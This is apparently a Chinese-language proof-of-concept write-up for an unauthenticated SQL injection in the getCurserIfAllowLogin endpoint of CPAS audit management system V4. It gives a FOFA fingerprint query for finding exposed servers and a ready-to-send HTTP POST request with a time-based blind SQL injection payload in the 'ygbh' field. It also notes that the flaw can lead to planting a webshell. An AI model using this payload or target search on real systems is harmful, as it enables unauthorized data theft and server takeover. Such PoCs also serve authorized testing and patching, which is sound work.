# CPAS审计管理系统getCurserIfAllowLogin存在SQL注入漏洞

友数聚 CPAS审计管理系统V4 getCurserIfAllowLogin 接口存在SQL注入，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```javascript
body="/cpasm4/static/cap/font/iconfont.css"
```

## poc
```javascript
POST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/plain, */*; q=0.01

ygbh=q' AND (SELECT 1635 FROM (SELECT(SLEEP(5)))mlQT) AND 'qoYJ'='qoYJ
```

![image-20241227215623148](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272156212.png)